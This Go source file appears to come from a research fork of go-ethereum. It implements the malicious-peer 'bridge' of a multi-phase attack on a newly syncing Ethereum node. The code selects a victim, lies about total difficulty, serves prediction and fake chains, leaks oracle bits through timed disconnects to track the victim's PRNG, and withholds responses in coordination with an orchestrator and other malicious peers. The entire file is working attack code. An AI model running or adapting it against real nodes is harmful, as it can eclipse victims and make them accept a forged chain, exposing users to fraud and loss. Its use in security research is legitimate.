package bridge

import "fmt"
import "net"
import "math/big"
import "time"
import "sync"
import "encoding/binary"
import "runtime"
// import "runtime/debug"
import "github.com/ethereum/go-ethereum/p2p"
import "github.com/ethereum/go-ethereum/ethdb"
import "github.com/ethereum/go-ethereum/core/types"
import "github.com/ethereum/go-ethereum/common"
import "github.com/ethereum/go-ethereum/core/state"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
)
var port string
var conn net.Conn
var incoming chan []byte
var quitCh chan struct{}
var attackPhase utils.AttackPhase
var mustCheatAboutTd bool
var servedBatches []bool
var numServedBatches int
var dropped chan bool
var master bool
var victim *p2p.Peer
var victimID string
var otherMaliciousPeers []string
var mustChangeAttackChain bool
var quitLock sync.Mutex
var victimLock sync.Mutex
var canServeLastFullBatch chan bool
var canServePivoting chan bool
var canDisconnect chan bool
var higherTd *big.Int
var bigOne = big.NewInt(1)
var avoidVictim bool			// Despite we need to only avoid connecting to the victim in
								// some moments, when this variable is set the peer will not
								// accept/dial any new p2p peer.
var lastOracleBit bool
var terminatingStateSync bool
var announcedSyncTD *big.Int
var announcedSyncHead common.Hash
var skeletonStart uint64
var fixedHead uint64
var pivot uint64
var rootAtPivot common.Hash
var prngSteps map[int]int
var rollback bool
var stateCache *state.Database
var withholdQuery uint64
var withholdACK bool
var withholding bool
var releaseCh chan struct{}



func SetOrchPort(p string) {
	port = p
}

func Initialize(id string) error {
	var err error

	err = createMgethDirIfMissing()
	if err != nil {
		log("Could not create local directory for mgeth")
		log("err =", err)
		return err
	}

	// By calling getChainDatabase(), we force the bridge to copy the prediction database into the local
	// directory and open it. This avoids an undesirable overhead at the first database query later on.
	if _, err = getChainDatabase(utils.PredictionChain); err != nil {
		log("Could not load", utils.PredictionChain, "chain database")
		log("err =", err)
		return err
	}

	conn, err = net.Dial("tcp", ADDR+":"+port)
	if err != nil {
		log("Could not connect to orchestrator")
		log("err =", err)
		return err
	}

	_, err = conn.Write([]byte(id))
	if err != nil {
		log("Could not send node's ID to orchestrator")
		log("err =", err)
		conn.Close()
		return err
	}

	attackPhase = utils.StalePhase
	mustCheatAboutTd = true
	numServedBatches = 0
	dropped = make(chan bool)
	master = false
	canServeLastFullBatch = make(chan bool, 1)
	canServePivoting = make(chan bool, 1)
	canDisconnect = make(chan bool)
	higherTd = utils.HigherTd
	avoidVictim = false
	lastOracleBit = false
	terminatingStateSync = false
	p2p.NoNewConnections = &avoidVictim
	//servedAccounts = big.NewInt(0)
	prngSteps = make(map[int]int)
	prngSteps[1] = 0
	prngSteps[100] = 0
	rollback = false
	releaseCh = make(chan struct{})

	incoming = make(chan []byte)
	go readLoop(conn, incoming, quitCh)
	go handleMessages()


	log("Initialized bridge")
	return nil
}

func SetMasterPeer() {
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Not setting as master peer due to insufficient number of malicious peers")
		return
	}

	master = true
	err := sendMessage(msg.MasterPeer)
	if err != nil {
		fatal(err, "Could not announce self as master peer")
	}
	log("Announced as master peer")
}

func SetVictimIfNone(v *p2p.Peer) {
	vID := v.ID().String()[:8]
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Ignoring victim", vID, "due to insufficient number of malicious peers")
		return
	}

	// Don't pick another malicious peer as a victim!
	for _, s := range otherMaliciousPeers {
		if vID == s {
			return
		}
	}

	victimLock.Lock()
	// We want either to pick a new victim or get the p2p.Peer object of the one already picked.
	// But we must avoid changing victim during the attack.
	if victim == nil && (victimID == "" || victimID == vID) {
		victim = v
		victimID = vID
		v.Dropped = dropped
		v.SetMustNotifyDrop(true)
		err := sendMessage(msg.SetVictim.SetContent([]byte(victimID)))
		if err != nil {
			Close()
			fatal(err, "Could not announce victim ID to orchestrator")
		}
		if attackPhase == utils.ReadyPhase {
			attackPhase = utils.PredictionPhase
			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
			if err != nil {
				Close()
				fatal(err, "Could not announce new phase to orchestrator")
			}
		} else if attackPhase == utils.PredictionPhase && lastOracleBit {
			attackPhase = utils.SyncPhase
			log("Switched to", attackPhase, "phase")

			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
			if err != nil {
				Close()
				fatal(err, "Could not announce new phase to orchestrator")
			}

			go stopMovingChecker()
			go rollbackChecker()
		} else if attackPhase == utils.SyncPhase {
			go stopMovingChecker()
			go rollbackChecker()
		}

		log("Set victim:", vID)

		// These two channels may remain full if the victim never sent the pivoting request
		// during previous syncOp, or it did but we disconnected before serving it (when leaked bit is 0).
		// Therefore, we clear them.
		L:
		for {
			select {
			case <-canServePivoting:
			case <-canDisconnect:
			case <-canServeLastFullBatch:		// Also this channel may remain full from previous syncOp
			case <-dropped:
			default:
				break L
    		}
		}
		servedBatches = make([]bool, len(servedBatches))
	} else {
		log("Ignoring victim: vID =", vID, ", victimID =", victimID, "victim =", victim, "&victim =", &victim)
	}
	victimLock.Unlock()
}


/*
func PeerDropped() {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not notify peer drop")

	default:
		dropped <- true
	}
}
*/

// This function would be useful to set the victim's p2p.Peer object in the non-master peer.
// However, the non-master peer doesn't need this object. So, the function does nothing for now.
func NewPeerJoined(peer *p2p.Peer) {
	return
}

func ServedBatchRequest(from uint64, peerID ...string) {
	if attackPhase != utils.ReadyPhase && attackPhase != utils.PredictionPhase {
		fatal(utils.StateError, "No invocation to ServedBatchRequest() should happen in", attackPhase, "phase")
	}

	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not notify served batch request")

	default:
		if peerID == nil || peerID[0] == "" {
			fatal(utils.ParameterErr, "Serving batch to unknown peer")
		}
		if victimID == "" {
			log("Doing nothing because victim is not set yet")
			return
		}
		if peerID[0] != victimID {
			fatal(utils.ParameterErr, "ServedBatchRequest() shouldn't be called on non-victim peer's queries")
		}
		
		if (from-1)%utils.BatchSize != 0 {
			fatal(utils.ParameterErr, "Error: served batch does not start with a multiple of", utils.BatchSize)
		}
		if (from-1)/utils.BatchSize == uint64(len(servedBatches)) {		// We are serving the last, partial batch
																		// containing the higher pivot and head
																		// We don't care about serving this batch
																		// Btw, we should never reach this branch
																		// as this request gets dropped earlier.
			return
		}


		// Non-master peer does not need to keep track of served batches
		leakNow := false
		victimLock.Lock()
		if (from-1)/utils.BatchSize == uint64(len(servedBatches)-2) && !servedBatches[int((from-1)/utils.BatchSize)] {
			canServeLastFullBatch <- true
			if master {
				err := sendMessage(msg.ServeLastFullBatch)
				if err != nil {
					fatal(err, "Could not notify to non-master peer to serve last full batch")
				}
			}
		} else if LastFullBatch(from) {		// If the last batch is being served, we don't care any longer about
											// the value in canServeLastFullBatch.
											// In case it remained full, we empty it now. However, note that
											// if the master peer receives the queries for both the last and
											// second-to-last full batches, the channel will remain full for
											// the non-master peer. So we need to empty it at the start of the
											// new syncOp.
			select {
			case <- canServeLastFullBatch:
			default:
			}
		}
		if master {
			if servedBatches[int((from-1)/utils.BatchSize)] {
				log("Batch request already served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)
				victimLock.Unlock()
				return
			}

			numServedBatches++
			if numServedBatches == len(servedBatches) {
				leakNow = true
			}
		}
		servedBatches[int((from-1)/utils.BatchSize)] = true
		victimLock.Unlock()
		log("Batch request served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)

		// Notify master peer about served batch
		if !master {
			content := make([]byte, 4)
			binary.BigEndian.PutUint32(content, uint32(from))
			content = append(content, []byte(peerID[0])...)
			err := sendMessage(msg.BatchRequestServed.SetContent(content))
			if err != nil {
				fatal(err, "Could not notify that batch", (from-1)/utils.BatchSize, "has been served")
			}
		}

		// All batches have been served, check whether the master peer gets dropped
		// and force a disconnection in any case afterwards
		if leakNow {
			victimLock.Lock()
			go func() {
				timeout := time.NewTimer(3*time.Second)
				var bit byte
				select {
				case <-timeout.C:
					log("Timeout fired, oracle bit is 1")
					bit = 1
				case <-dropped:
					log("Dropped by victim, oracle bit is 0")
					bit = 0
				case <-quitCh:
					log("Quitting")
					victimLock.Unlock()
					return
				}
				timeout.Stop()

				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
				SendOracleBit(bit)
				if victim == nil {
					var buff [1024]byte
				    numm := runtime.Stack(buff[:], true)
				    fmt.Println(string(buff[:]), numm)
					fatal(utils.ParameterErr, "Victim shouldn't be nil here")
				}
				victim.SetMustNotifyDrop(false)
				avoidVictim = true

				if bit==1 {
					<-canDisconnect				// When bit==0, we disconnect without waiting for serving the pivoting
												// request. This is because the victim will already restart a new
												// syncOp due to the invalid header it encountered.
				}
				victim.Disconnect(p2p.DiscUselessPeer)
				victim = nil // Since we disconnect, the Peer object referencing the victim cannot be use any longer
				master = false
				servedBatches = make([]bool, numServedBatches) // Reset all values to false
				numServedBatches = 0
				log("Reset victim: victim =", victim, "&victim =", &victim)

				/*
				Every time a peer is picked as master, we will make it announce a TD higher than the
				previously announced one during the next handshake.
				By using the increments defined below, we ensure that the two malicious peers really
				alternate. This is needed due to a bug in Go Ethereum, where a master peer can be reelected
				immediately after dropping it because it has not been removed yet from the peerset.
				This causes the victim to use a master peer which is disconnected, introducing a 1-minute
				delay for the useless syncOp to time out.
				*/
				higherTd.Add(higherTd, bigOne)
				victimLock.Unlock()
			}()
		}
	}
}

func ReceivedLastRangeQuery() {
	/*
	Upon receiving last query of state sync, we need to make the current syncOp fail.
	To do so, we disconnect from the victim.
	*/

	// For now, we wait for the phase to switch to sync. Later on, this function should be automatically
	// called when the phase has already switched. Thus, the goroutine may become unnecessary.
	go func() {
		//return // Remove this to enable correct behaviour
		for attackPhase != utils.SyncPhase {
			time.Sleep(100*time.Millisecond)
		}
		if !master {
			victimLock.Lock()
			terminatingStateSync = true
			victim.Disconnect(p2p.DiscUselessPeer)
			victimLock.Unlock()
		}
	}()
}

/*
func ServedAccountRange(lastResponse bool) {
	
	amount := new(big.Int).Sub(to.Big(), from.Big())
	servedAccounts.Add(servedAccounts, amount)
	log("Served accounts:", servedAccounts)
	

	if master && lastResponse
}
*/

/*
func areAllBatchesServed() bool {
	for _, served := range servedBatches {
		if !served {
			return false
		}
	}
	return true
}
*/


func GetAttackPhase() utils.AttackPhase {
	return attackPhase
}


func DoingPrediction() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
		return false
		
	default:
		return (attackPhase==utils.PredictionPhase)
	}
}

func DoingPredictionOrReady() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
		return false
		
	default:
		return (attackPhase==utils.PredictionPhase || attackPhase==utils.ReadyPhase)
	}
}

func DoingSync() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
		return false
		
	default:
		return (attackPhase==utils.SyncPhase)
	}
}

func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not serve", chainType, "chain")
		return nil
		
	default:
		db, err := getChainDatabase(chainType)
		if err != nil {
			fatal(err, "Could not serve", chainType, "chain")
		}
		return db
	}
}

func SetTrueChain(db ethdb.Database, stateCacheBc *state.Database) {
	setChainDatabase(db, utils.TrueChain)
	stateCache = stateCacheBc
}

func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash, error) {
	select {
	case <-quitCh:
		return nil, false, nil, utils.BridgeClosedErr
		
	default:
		//Don't do anything if we are not ready yet
		if attackPhase==utils.StalePhase {
			return nil, false, nil, nil
		}

		// Don't cheat to other malicious peers!
		if IsMalicious(peerID) {
			log("Not cheating about TD to peer", peerID)
			return nil, false, nil, nil
		}

		/*	Don't cheat to nodes already in sync.
			Note that the attack may work with a victim which has already started the synchronization process
			but hasn't finished it yet. So, we may cheat to nodes with a peerTD > predictionTD, but smaller than the
			real chain's TD. However, the code implements an attack against fresh victims only, so we are fine
			here by cheating only to nodes with peerTD <= predictionTD.
			Note that a fresh victim can announce a TD higher than 0, or than genesis's difficulty, because we
			gave it some blocks of the prediction chain and it may do a handshake with the malicious peers before
			rolling back such blocks. So, the correct threshold to use here is indeed predictionTD.
		*/

		if (attackPhase == utils.PredictionPhase || attackPhase == utils.ReadyPhase) && !lastOracleBit {
																		// When the non-master peer of the last
																		// syncOp of the prediction phase
																		// does the handshake with the victim,
																		// it already needs to announce the TD for
																		// the syncPhase.
			predictionTD := getTd(utils.PredictionChain)
			log("Prediction TD in database:", predictionTD)
			if peerTD.Cmp(predictionTD) > 0 {
				return nil, false, nil, nil
			}
			log("Cheating to peer", peerID, "if necessary at this point")
			head := latest(utils.PredictionChain).Hash()
			return higherTd, mustCheatAboutTd, &head, nil
		}

		// Below this point, we are already in some later stage of the attack. Therefore, we have to cheat
		// only to our victim.
		if peerID != victimID {
			return nil, false, nil, nil
		}

		// From here on, it is implicit that we are dealing with the victim.

		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
		   		if announcedSyncTD == nil {
					td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
					log("True TD in database (+suppl.):", td)
					var head common.Hash
					if fixedHead == 0 {
						head = latest(utils.TrueChain).Hash()
					} else {
						head = getHeaderByNumber(utils.TrueChain, fixedHead).Hash()
					}
					announcedSyncHead = head
					announcedSyncTD = td
					content := make([]byte, 0)
					content = append(content, announcedSyncHead.Bytes()...)
					content = append(content, announcedSyncTD.Bytes()...)
					err := sendMessage(msg.AnnouncedSyncTd.SetContent(content))
					if err != nil {
						fatal(err, "Could not notify announcedSyncTd")
					}
					return td, mustCheatAboutTd, &head, nil
				} else {
					td := new(big.Int).Sub(announcedSyncTD, bigOne)
					return td, mustCheatAboutTd, &announcedSyncHead, nil
				}
		}

		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
			td := getTd(utils.FakeChain)		// For now, I am assuming the fake chain has the total difficulty
												// from genesis and not just the difficulty of the fake segment.
			head := latest(utils.FakeChain).Hash()

			if attackPhase==utils.SyncPhase && terminatingStateSync {
				go func() {
					err := sendMessage(msg.TerminatingStateSync)
					if err != nil {
						fatal(err, "Could not notify state sync termination")
					}
				}()
			}

			return td, mustCheatAboutTd, &head, nil
		}
	}
	return nil, false, nil, nil // This line should never be hit
}

/*
func AvoidVictim() bool {
	return avoidVictim
}
*/

/*
func GetHigherHeadAndPivot() (*types.Header, *types.Header) {
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		log("Returning higher head and pivot for", utils.PredictionChain, "chain even if we are in", attackPhase)
		chainType = utils.PredictionChain
	}
	return getHigherHeadAndPivot(chainType)
}
*/

func PredictionBatchExists(from uint64) bool {
	if (from-1)%utils.BatchSize != 0 {
		fatal(utils.ParameterErr, "Error: passed batch does not start with a multiple of", utils.BatchSize)
	}

	if (from-1)/utils.BatchSize >= uint64(len(servedBatches)) {
		return false
	}
	return true
}

// Note: the update logic for 'mustChangeAttackChain' works as long as MustChangeAttackChain() gets called
// only in a single point by geth. If multiple pieces of code manage their own attackChain, this won't work
// any longer.
func MustChangeAttackChain() (bool, utils.ChainType) {
	result := mustChangeAttackChain
	mustChangeAttackChain = false

	ct := attackPhase.ToChainType()
	if ct == utils.InvalidChainType {
		ct = utils.PredictionChain
	}

	return result, ct
}

func MustUseAttackChain(query *GetBlockHeadersPacket) bool {
	if victimID == "" {
		return false
	}

	// When switching from prediction to sync phase, the first master of the sync phase must
	// already use the honest chain to provide the head and pivot at the start of the syncOp.
	// However, it will also receive queries of the previous syncOp which is still malicious,
	// so we can't tell whether to use the attack chain simply by checking the phase.
	if attackPhase==utils.PredictionPhase && lastOracleBit && query.Reverse && query.Amount == 2 {
		return false
	}
	if (attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase) {
		return true
	}
	return false
}


func SendOracleBit(bit byte) {
	err := sendMessage(msg.OracleBit.SetContent([]byte{bit}))
	if err != nil {
		fatal(err, "Could not send oracle bit to orchestrator")
	}
	log("Sent oracle bit", bit)

	/*
	if lastOracleBit {
		attackPhase = utils.SyncPhase
		log("Switched to", attackPhase, "phase")
	}
	*/
}


func LastFullBatch(from uint64) bool {
	if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)-1) {
		return true
	}
	return false
}

func LastPartialBatch(from uint64) bool {
	// For now, we always hit this first if-block because we don't need this function in other places
	// than the prediction phase.
	if true || DoingPredictionOrReady() {
		if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)) {
			return true
		}
		return false
	}

	// This might get useful in the future, but we must check if it interferes with the end of the prediction
	// phase where the variable 'attackPhase' has already been updated to SyncPhase.
	if false && DoingSync() {
		if from + utils.BatchSize >= fixedHead {
			return true
		}
		return false
	}
	return false
}


func Latest(chainTypeArg ...utils.ChainType) *types.Header {
	chainType := attackPhase.ToChainType()

	if chainType == utils.InvalidChainType {
		/*
		fatal(utils.ParameterErr, "Trying to get latest block while attack is stale")
		return nil
		*/
		log("Latest() returning latest block of", utils.PredictionChain, "chain even if we are in", attackPhase)
		chainType = utils.PredictionChain
	}
	return latest(chainType)
}

func Genesis() *types.Header {
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		log("Genesis() returning genesis block of", utils.PredictionChain, "chain even if we are in", attackPhase)
		chainType = utils.PredictionChain
	}
	return genesis(chainType)
}


func IsVictim(id string) bool {
	return victimID==id
}

func IsMaster() bool {
	return master
}

func DelayBeforeServingBatch() {
	time.Sleep(3*time.Second)
}

func MiniDelayBeforeServingBatch() {
	time.Sleep(3000*time.Millisecond)
}

func WaitBeforePivoting() {
	timeout := time.NewTimer(10*time.Second)
	log("Waiting before pivoting")
	select {
	case <-canServePivoting:
		timeout.Stop()
	case <-timeout.C:			// Avoiding the eth/handlers to stall forever (this should happen hardly ever btw)
		log("Odd case happened: pivoting request arrived after peer re-election as master")
	}
}

func PivotingServed() {
	log("Pivoting request served")
	if attackPhase == utils.PredictionPhase && lastOracleBit {
		//attackPhase = utils.SyncPhase
		//log("Switched to", attackPhase, "phase")
	}
	if attackPhase == utils.PredictionPhase || (attackPhase == utils.SyncPhase && terminatingStateSync) {
		canDisconnect <- true
	}
}

func WaitBeforeLastFullBatch() {
	<-canServeLastFullBatch
	time.Sleep(500*time.Millisecond)
}

func SetAnnouncedSyncTD(td *big.Int) {
	announcedSyncTD = td
}

func SetSkeletonStart(start uint64) {
	// Keep track of skeleton only during sync phase.
	if attackPhase != utils.SyncPhase {
		return
	}

	// This skeleton announcement may be following a rollback. In this case, we need to update the info
	// on the PRNG state.
	if rollback {
		rollback = false
		err := sendMessage(msg.Rollback.SetContent([]byte{0}))
		if err != nil {
			fatal(err, "Could not notify update to 'rollback'")
		}
		ancestor := start - utils.BatchSize
		lastProcessed := ancestor + 2048

		// Relative position of lastProcessed in the previous skeleton.
		// E.g., if the previous skeleton was (24576)-24768-24960-... and lastProcessed == 24961,
		// then relPosition == 384 as it is block 0 (i.e. the first one) of the third batch of the skeleton.
		relPosition := (lastProcessed - skeletonStart + utils.BatchSize - 1)
		unverifiedBatches := 128 - relPosition/utils.BatchSize

		// If the rollback happened because a peer of the victim provided a well-formed batch with an invalid
		// PoW at some block, then seals for that batch were already generated and we should count them, that is,
		// we should do 'unverifiedBatches--'.
		// However, there's no way to know this, so we assume the reason is a malformed batch.
		// In other words, we assume other peers to behave "not too maliciously".

		StepPRNG(-2*int(unverifiedBatches), 100)
	}

	skeletonStart = start
}


func stopMovingChecker() {
	for {
		time.Sleep(1*time.Second)

		if !master {
			return
		}

		if attackPhase != utils.SyncPhase || announcedSyncTD == nil {
			continue
		}

		headNumber := latest(utils.TrueChain).Number.Uint64()

		// Should work with ... >= 88 as well, but doesn't make a big difference
		if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
			if fixedHead == 0 {
				fixedHead = headNumber
				log("Fixed head for sync phase,", "number =", fixedHead)
				r := getHeaderByNumber(utils.TrueChain, fixedHead-64).Root
				err := (*stateCache).TrieDB().Commit(r, true, nil)
				if err != nil {
					fatal(err, "Cannot commit root at pivot,", "pivot =", fixedHead-64, "root =", r)
				}

			}
			return
		}
	}
}

func StopMoving() bool {
	log("Call to StopMoving()...")
	if attackPhase != utils.SyncPhase {
		return false
	}

	if fixedHead > 0 {
		log("... returned true")
		return true
	}

	headNumber := latest(utils.TrueChain).Number.Uint64()
	log("... returned false, td =", getTd(utils.TrueChain), ", want =", announcedSyncTD, ", L =", (headNumber - skeletonStart)%utils.BatchSize)
	return false
}

func FixedHead() uint64 {
	return fixedHead
}

func SetPivot(pivotNumber uint64) {
	pivot = pivotNumber
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		log("Not setting any pivot because we are in", attackPhase, "phase")
	}
	rootAtPivot = getHeaderByNumber(chainType, pivot).Root
	log("Pivot set", "pivot", pivot, "root", rootAtPivot)


	// Shouldn't be necessary, but keep it commented for later maybe
	/*
	if fixedHead != 0 {
		err := (*stateCache).TrieDB().Commit(rootAtPivot, true, nil)
		if err != nil {
			fatal(err, "Cannot commit root at pivot,", "pivot =", pivot, "root =", rootAtPivot)
		}
	}
	*/
}

func RootAtPivot() common.Hash {
	return rootAtPivot
}

func StepPRNG(num, frequency int) {
	if frequency != 1 && frequency != 100 {
		fatal(utils.ParameterErr, "checkFrequency has an unusual value:", frequency)
	}
	prngSteps[frequency] += num
}

func CommitPRNG() {
	steps_1 := make([]byte, 4)
	steps_100 := make([]byte, 4)
	binary.BigEndian.PutUint32(steps_1, uint32(prngSteps[1]))
	binary.BigEndian.PutUint32(steps_100, uint32(prngSteps[100]))
	content := make([]byte, 0)
	content = append(content, steps_1...)
	content = append(content, steps_100...)
	err := sendMessage(msg.InfoPRNG.SetContent(content))
	if err != nil {
		fatal(err, "Could not commit PRNG info")
	}
}


func rollbackChecker() {
	<-dropped
	rollback = true
	err := sendMessage(msg.Rollback.SetContent([]byte{1}))
	if err != nil {
		fatal(err, "Could not notify update to 'rollback'")
	}
	master = false
}

func TryWithhold(query uint64) bool {
	if !withholdACK {
		if master {
			content := make([]byte, 8)
			binary.BigEndian.PutUint64(content, query)
			err := sendMessage(msg.WithholdInit.SetContent(content))
			if err != nil {
				fatal(err, "Could not init choice of first query to withhold")
			}
		}
		withholdQuery = query
	} else if !withholding {
		if query - withholdQuery >= 2048 {
			content := make([]byte, 8)
			binary.BigEndian.PutUint64(content, query)
			err := sendMessage(msg.Release.SetContent(content))
			log("Releasing response for query.Origin =", withholdQuery)
			if err != nil {
				fatal(err, "Could not release withheld query and set new one")
			}
			withholding = true
			withholdQuery = query
		}
	} else {
		fatal(utils.StateError, "Withholding peer should not receive a second query.")
	}
	return true
}

func MustWithhold(query uint64) bool {
	for !withholdACK {
		time.Sleep(100*time.Millisecond)
	}
	return query==withholdQuery
}

func ReleaseResponse() chan struct{} {
	return releaseCh
}


func Close() {
	quitLock.Lock()
	select {
	case <-quitCh:
	default:
		close(quitCh)
		close(incoming)
		conn.Close()
	}
	quitLock.Unlock()
}


func addMaliciousPeer(peer string) {
	for _, s := range otherMaliciousPeers {
		if s == peer {
			return
		}
	}
	
	log("New malicious peer:", peer)
	otherMaliciousPeers = append(otherMaliciousPeers, peer)
}

func IsMalicious(peer string) bool {
	for _, s := range otherMaliciousPeers {
		if peer == s {
			return true
		}
	}
	return false
}


func handleMessages() {
	for {
		select {
		case <-quitCh:
			log("Stopping message handler")
			return

		case messageAsBytes := <-incoming:
			message := msg.Decode(messageAsBytes)
			switch message.Code {
			case msg.NextPhase.Code:
				attackPhase += 1
				// What about setting mustChangeAttackChain here?
				// For now msg.NextPhase is never used, so we don't care.
			case msg.SetCheatAboutTd.Code:
				switch message.Content[0] {
				case 0:
					mustCheatAboutTd = false
				case 1:
					mustCheatAboutTd = true
				}
			case msg.SetNumBatches.Code:
				numBatches := int(binary.BigEndian.Uint32(message.Content))
				servedBatches = make([]bool, numBatches)
				log("Set numBatches to", numBatches)
			case msg.BatchRequestServed.Code:
				from := binary.BigEndian.Uint32(message.Content[:4])
				servedPeer := string(message.Content[4:])
				go ServedBatchRequest(uint64(from), servedPeer)
			case msg.SetVictim.Code:
				log("Set victim msg received, phase =", attackPhase)
				victimLock.Lock()
				victimID = string(message.Content)
				servedBatches = make([]bool, len(servedBatches))
				select {
				case <-canServeLastFullBatch:		// If still full, we empty this channel
													// now that a new syncOp is starting
				default:
				}
				higherTd.Add(higherTd, bigOne)

				/*
				if attackPhase == utils.PredictionPhase && lastOracleBit {
					attackPhase = utils.SyncPhase
					log("Switched to", attackPhase, "phase")
				}
				*/
				avoidVictim = false
				victimLock.Unlock()
			case msg.NewMaliciousPeer.Code:
				addMaliciousPeer(string(message.Content))
			case msg.SetAttackPhase.Code:
				newAttackPhase := utils.AttackPhase(message.Content[0])
				if newAttackPhase != attackPhase {
					attackPhase = newAttackPhase
					log("Attack phase switched to", attackPhase)
					if attackPhase != utils.StalePhase && attackPhase != utils.SyncPhase {
						mustChangeAttackChain = true
					}
					if attackPhase == utils.DeliveryPhase {
						CommitPRNG()
					}
				}
			case msg.ServeLastFullBatch.Code:
				if !servedBatches[len(servedBatches)-2] {
					canServeLastFullBatch <- true
					servedBatches[len(servedBatches)-2] = true
				}
			case msg.AvoidVictim.Code:
				switch message.Content[0] {
				case 0:
					avoidVictim = false
				case 1:
					avoidVictim = true
				}
			case msg.LastOracleBit.Code:
				lastOracleBit = true
				log("Last oracle bit set")
			case msg.TerminatingStateSync.Code:
				terminatingStateSync = true
				go func() {
					<-canDisconnect
					victim.Disconnect(p2p.DiscUselessPeer)
					attackPhase = utils.DeliveryPhase
					err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
					if err != nil {
						fatal(err, "Could not notify switch to", attackPhase, "phase")
					}
					log("Switched to", attackPhase, "phase")
					mustChangeAttackChain = true

					CommitPRNG()
				}()
			case msg.AnnouncedSyncTd.Code:
				announcedSyncHead = common.BytesToHash(message.Content[:common.HashLength])
				announcedSyncTD = new(big.Int).SetBytes(message.Content[common.HashLength:])
			case msg.Rollback.Code:
				switch message.Content[0] {
				case 0:
					rollback = false
				case 1:
					rollback = true
				}
			case msg.WithholdInit.Code:
				go func() {
					for withholdQuery == 0 {
						time.Sleep(100*time.Millisecond)
					}
					query := binary.BigEndian.Uint64(message.Content)
					if query < withholdQuery {
						withholdQuery = query
						err := sendMessage(msg.WithholdACK.SetContent([]byte{1}))
						if err != nil {
							fatal(err, "Could not reply to init of withheld query")
						}
						withholding = false
					} else {
						content := make([]byte, 8)
						binary.BigEndian.PutUint64(content, withholdQuery)
						content = append([]byte{0}, content...)
						err := sendMessage(msg.WithholdACK.SetContent(content))
						if err != nil {
							fatal(err, "Could not reply to init of withheld query")
						}
						withholding = true
					}
					log("Comparison brought to withholdQuery =", withholdQuery)
					withholdACK = true
				}()
			case msg.WithholdACK.Code:
				switch message.Content[0] {
				case 0:
					query := binary.BigEndian.Uint64(message.Content[1:])
					withholdQuery = query
					withholding = false
				case 1:
					withholding = true
				}
				log("ACK received, withholdQuery =", withholdQuery)
				withholdACK = true
			case msg.Release.Code:
				withholding = false
				releaseCh <- struct{}{}
				withholdQuery = binary.BigEndian.Uint64(message.Content)
				log("Set withholdQuery =", withholdQuery)

			/*
			case msg.MustDisconnectVictim.Code:
				switch message.Content[0] {
				case 0:
					mustDisconnectVictim <- false
				case 1:
					mustDisconnectVictim <- true
				}

			case msg.SolicitMustDisconnectVictim.Code:
				go func() {
					if master {
						mdv := <-mustDisconnectVictim
						content := byte(0)
						if mdv {
							content = byte(1)
						}
						sendMessage(msg.MustDisconnectVictim.SetContent([]byte{content}))
					}
				}()
			*/
			case msg.Terminate.Code:
				Close()
			}
		}
	}
}

func sendMessage(message *msg.Message) error {
	buf := message.Encode()
	n, err := conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

